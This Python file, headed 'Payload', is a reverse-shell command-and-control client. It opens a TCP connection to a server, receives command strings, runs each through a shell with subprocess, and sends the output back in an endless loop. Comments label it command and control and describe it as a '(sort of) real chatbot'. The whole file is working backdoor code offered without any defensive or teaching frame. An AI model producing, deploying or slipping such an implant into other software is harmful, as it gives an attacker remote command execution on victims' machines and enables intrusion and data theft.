## Payload

import socket
import re
import subprocess as sp
import os


PORT = 5064
HEADER = 64

DISCONNECT_MESSAGE = "!quit"
FORMAT = 'utf-8'
SERVER = "127.0.0.1"

ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def connect():
    client.connect(ADDR)
    return("connected")

## for establishing connection with server
def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    ## first message sent
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

    #recieved_message = client.recv(10000)

    #print(recieved_message.decode(FORMAT))
    #return(recieved_message.decode(FORMAT))

## changing it up to a (sort of) real chatbot

## for command and control
def C_C():
    ## Command/message recieved from server
    recieved_message = client.recv(10000).decode(FORMAT)
    
    ## for debugging, prints command output - but sp does that anyways
    #print(recieved_message)
    
    if recieved_message == DISCONNECT_MESSAGE:
        output = "Disconnecting"
        exit()
                
        ## catching accidental enter keys
    elif recieved_message == "":
        client.send(str("EMPTY - Try again").encode(FORMAT))
                
    ## running commands
    else:
        try:
            output = sp.check_output(recieved_message, shell=True)
            #output = sp.getoutput(recieved_message)
            #print(output)
            client.send(str(output).encode(FORMAT))
        except sp.CalledProcessError:
            client.send(str("INVALID COMMAND").encode(FORMAT))
            
            
    

def mainloop():
    
    #user_input = input("|ChatBot: ")
    #send(user_input)
    C_C()



        
if __name__ == "__main__":
    ## connect to server
    connect()
    
    ## sending initial message to connect back(should be random in future iterations)
    #send("1234")

    # running mainloop
    while True:
        mainloop()
